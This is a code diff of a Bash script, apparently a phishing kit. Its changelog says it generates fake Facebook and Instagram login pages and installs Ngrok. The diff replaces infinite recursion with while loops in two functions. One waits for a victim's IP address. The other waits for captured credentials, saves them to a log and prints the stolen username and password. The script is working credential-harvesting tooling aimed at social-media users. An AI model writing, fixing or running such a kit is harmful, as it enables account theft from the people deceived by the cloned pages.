@@ -31,12 +31,15 @@
 #     Adicionado o comando JQ no lugar do GREP
 # v0.3 2023-01-07, Oliver Silva:
 #     Adicionado instalador Ngrok
+# v0.4 2023-01-08, Oliver Silva:
+#     Adicionado o loop while no lugar da recursão infinita evitando o bug 'Segmentation fault'
 #
 # Licença: MIT License
 #
 # Versão 0.1: Gera páginas somente facebook e instagram
 # Versão 0.2: Troca do GREP pelo JQ pra formatação dos dados
 # Versão 0.3: Instalador Ngrok
+# Versão 0.4: Bug 'Segmentation fault' resolvido o qual foi causado pela recursão infinita
 #
 
 
@@ -162,33 +165,30 @@ getDataCaptured() {
 }
 
 get_ip() {
-    if [ -f ./www/ip.txt ] ; then
-	ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
-	printf "\r\e[32m[-] Conexão aberta: \e[33;1m$ip\e[0m\n"
-
-    else
+    while [ ! -f ./www/ip.txt ] ; do
 	printf "\r\e[32m[*] Escultando conexão...\e[0m"
-	get_ip
-    fi
+    done
+
+    ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
+        printf "\r\e[32m[-] Nova conexão aberta: \e[33;1m$ip\e[0m\n"
 }
 
 get_data() {
-    if [ -f ./www/src/dados.txt ] ; then
-        [ ! -d ./logs ] && mkdir logs
-	cat ./www/src/dados.txt > ./logs/dataSocial.txt
-	
-	printf "\r\e[32m[-] Credenciais capturadas:\e[0m\n"
-	printf "\r\e[32m[+] Seu log está em \e[32;1mlogs/dataSocial.txt\e[0m\n"
-	usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
-	senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)
-
-	echo -e "\e[32m[-] Usuário: \e[34;1m$usuario\e[0m"
-	echo -e "\e[32m[-] Senha: \e[34;1m$senha\e[0m"
-
-    else
+    while [ ! -f ./www/src/dados.txt ] ; do 
 	printf "\r\e[32m[*] Aguardando credenciais...\e[0m"
-	get_data
-    fi
+    done
+
+    [ ! -d ./logs ] && mkdir logs
+
+    cat ./www/src/dados.txt > ./logs/dataSocial.txt
+    printf "\r\e[32m[-] Credenciais capturadas:   \e[0m\n"
+    printf "\r\e[32m[+] Seu log está em \e[32;1mlogs/dataSocial.txt\e[0m\n"
+
+    usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
+    senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)
+
+    echo -e "\e[32m[-] Usuário: \e[34;1m$usuario\e[0m"
+    echo -e "\e[32m[-] Senha: \e[34;1m$senha\e[0m"
 }
 
 banner() {
